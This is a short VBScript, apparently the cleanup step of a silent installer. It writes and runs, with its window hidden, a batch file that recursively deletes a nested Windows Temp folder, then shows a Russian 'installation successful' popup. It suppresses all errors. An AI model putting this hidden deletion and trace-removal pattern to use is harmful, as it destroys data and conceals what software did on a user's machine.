On Error Resume Next
Set objFso = CreateObject("Scripting.FileSystemObject")
Set objFile = objFso.CreateTextFile("C:\WINDOWS\Temp\Temp\Temp\vbs\del.cmd") 
With objFile 
.WriteLine "cd C:\Windows"  
.WriteLine "rd /q /s C:\Windows\Temp\Temp" 
.Close 
End With 
set oShell = WScript.CreateObject ("WScript.Shell")
oShell.Popup "Установка успешно завершена! =)", 5, "Информация", 4096
set WshShell = WScript.CreateObject("WScript.Shell")   
WshShell.Run "c:\WINDOWS\Temp\Temp\Temp\vbs\del.cmd", 0, false    
